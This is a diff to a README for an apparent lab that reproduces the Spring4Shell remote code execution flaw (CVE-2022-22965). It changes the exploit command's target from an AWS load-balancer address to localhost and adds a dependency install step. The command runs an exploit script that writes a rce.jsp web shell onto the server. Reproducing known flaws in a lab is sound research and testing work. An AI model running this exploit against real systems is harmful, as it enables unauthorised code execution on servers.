@@ -14,7 +14,8 @@ Minimal example of how to reproduce CVE-2022-22965 Spring RCE.
 
 3. Exploit the Application
     ```shell
-     python3 exploits/exploit.py --url http://Iaac-Secure-stack-blue-ALB-1228966533.us-east-1.elb.amazonaws.com/spring4shell/kudos --dir "hacked" --file rce
+     pip3 install -r requirements.txt
+     python3 exploits/run.py --url http://localhost:8080/spring4shell/kudos --dir hacked --file rce
     ```
     The exploit is going to create `rce.jsp` file in  `webapps/hacked` on the web server.
 
